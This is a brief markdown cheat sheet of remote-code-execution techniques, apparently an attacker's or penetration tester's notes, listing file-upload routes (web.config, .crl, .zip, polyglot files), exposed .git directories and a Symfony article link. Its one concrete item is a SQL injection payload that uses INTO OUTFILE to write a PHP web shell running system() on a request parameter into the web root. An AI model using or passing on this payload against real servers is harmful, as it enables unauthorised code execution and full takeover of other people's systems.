# RCE Methods
## in asp web.config upload to RCE & .crl upload to rce
## In PHP .zip upload to rce 
## Polygloit File Upload To Rce
## .git Exposed To RCE
```bash
It happends often. Check For Misconfigurations
```

## In php Symfony-based websites
```bash
https://portswigger.net/daily-swig/symfony-based-websites-open-to-rce-attack-research-finds
```

# Found SQLi ? Now rce
```bash
For Remote code execution I used a simple payload inside phpmyadmin page and I got RCE.
Payload : SELECT “<?php system($_GET[‘<anyParameter>’]); ?>” into outfile “/var/www/html/<filename>.php”
```
